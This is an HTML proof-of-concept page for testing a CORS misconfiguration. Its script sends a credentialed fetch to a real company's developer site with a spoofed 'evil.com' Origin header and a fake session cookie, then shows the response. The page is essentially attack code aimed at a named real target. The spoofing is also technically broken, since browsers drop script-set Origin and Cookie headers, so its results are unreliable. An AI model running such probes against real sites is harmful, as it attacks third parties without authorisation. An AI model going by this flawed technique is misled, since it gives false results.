<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CORS Misconfiguration PoC</title>
</head>
<body>
  <h1>CORS Misconfiguration Proof of Concept</h1>
  <button id="testCors">Test CORS</button>
  <pre id="result"></pre>

  <script>
    document.getElementById('testCors').onclick = async () => {
      try {
        const response = await fetch('https://developers.afterpay.com/docs/api/welcome/getting-started', {
          method: 'GET',
          headers: {
            'Origin': 'https://evil.com',
            'Cookie': 'CF_AppSession=xyz123' // Simulated cookie header
          },
          credentials: 'include' // to send cookies
        });
        const text = await response.text();
        document.getElementById('result').textContent = `Status: ${response.status}\n\nResponse:\n${text.substring(0, 500)}...`;
      } catch (err) {
        document.getElementById('result').textContent = `Error: ${err.message}`;
      }
    };
  </script>
</body>
</html>
